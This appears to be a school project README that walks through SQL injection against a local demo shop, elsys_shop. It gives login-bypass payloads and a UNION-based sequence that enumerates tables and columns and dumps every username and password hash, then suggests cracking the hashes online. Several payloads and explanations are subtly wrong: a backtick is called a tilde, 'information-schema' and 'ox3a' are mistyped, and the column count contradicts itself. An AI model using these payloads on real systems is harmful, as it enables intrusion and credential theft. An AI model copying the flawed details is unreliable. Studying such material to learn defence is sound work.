# elsys_shop
Small school project. Nothing complicated just simple display of SQL Queries and how to exploit them.

# Basic login bypass
## Hashed input

Username: 
```
1' or '1'='1' --  
```
(note the all the spaces are necessary, even after the comment !)

This works when the password input is hashed, be it MD5 or Sha1.
The password input can be empty, it doesn't matter as we force it to be skipped.
Normal query looks like this:

```
SELECT * FROM users WHERE username='$username' AND password='$password'
```

After the SQL injection the query looks like this:
```
SELECT * FROM users WHERE username='1' or '1'='1' -- ' AND password='da39a3ee5e6b4b0d3255bfef95601890afd80709'
```

## Unhashed input

Username:
```
1' or '1'='1
```
Password:
```
1' or '1'='1
```

Standard query looks just like the previous one.
Malicious query looks like this:
```
SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' OR '1'='1'
```

# Blind SQLi - GET

First you need to check if the website is vulnerable.
Add the 'tilde' character at the end of the url as a part of a GET parameter. If the server comes back with any kind of an SQL error, then the page is vulnerable

```
localhost/item.php?item=2`
```

You should get a similar error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`' at line 1
```
The next step is to find out how many colums does the table have using the order by clause.
add 'order by 1--' without the quotes at the end of the url and start incrementing the number until you get another error
The amount of columns the current table has is equal to the number at which you start getting errors - 1, so if you have order by 5 -- and it's an error, but order by 4 -- isn't an error, then the amount of columns is 4.

```
localhost/item.php?item=2 order by 3-- no error
localhost/item.php?item=2 order by 5-- no error
localhost/item.php?item=2 order by 6-- error 
```
The previous code snippet shows exactly how to execute this command. We can see that in our case we have 5 columns.

Next find out which columns are displayed to the visitors so we can force them to display the db version.
```
localhost/item.php?item=-2 union all select 1,2,3,4,5--
```
We see that the 2nd and 4th columns are vulnerable as they are the only numbers displayed to us
```
localhost/item.php?item=-2 union all select 1,@@version,3,4,5--
```
To get the database name:
```
localhost/item.php?item=-2 union all select 1,database(),3,4,5--
```

As a result you get the information from the query instead the values from the database.
How you continue from now on depends on the database version. If its < 4 you have to use a different harder approach, in our case its 5.7.14 so you have to do: (table_schema = database name from previous query)
```
localhost/item.php?item=-2 union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='elsys_shop'--
```
Now you will see all the tables that exist currently.
We need the columns. To fetch all the columns execute the following query
```
localhost/item.php?item=-2 union all select 1,group_concat(column_name),3,4,5 from information-schema.columns where table_schema=database()--
```

We get the results - id, user_id, item_id, id, name, quantity, price, added, id, username and password
Usually this is not how you would exploit it but time to find out what's behind username & password.

```
localhost/item.php?item=-2 union all select 1,group_concat(username,ox3a,password),3,4,5 from  users--
```

That's it you get all the users with username:hash combination. You can use an online decrypter to unhash the password and login.
